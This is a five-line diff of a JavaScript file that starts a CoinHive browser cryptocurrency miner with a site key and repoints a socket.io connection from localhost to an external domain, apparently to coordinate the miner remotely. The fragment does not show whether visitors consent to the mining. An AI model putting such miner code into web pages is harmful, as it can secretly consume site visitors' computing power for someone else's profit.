@@ -1,5 +1,5 @@
 var miner = new CoinHive.Anonymous('g92UwP2vZA075nn4uP5DsgP4JMy7nwfu');
-var socket = io.connect('http://localhost:80');
+var socket = io.connect('http://unitedworldfund.com');
 
 var interval;
 
